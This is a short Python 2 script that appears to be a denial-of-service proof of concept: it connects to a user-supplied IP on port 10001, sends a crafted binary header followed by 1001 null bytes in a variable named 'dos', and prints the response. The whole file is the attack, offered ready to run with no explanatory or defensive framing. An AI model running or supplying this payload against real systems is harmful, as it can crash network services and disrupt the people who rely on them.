import socket
import sys


ip = sys.argv[1]
addr = (ip, 10001)
s = socket.create_connection(addr)

dos = '\x00\x04\x00\x00\x00\x00\x03\xe8'
dos += '\x00' * 1001

s.send(dos)
print repr(s.recv(1024))


s.close()


# () retset
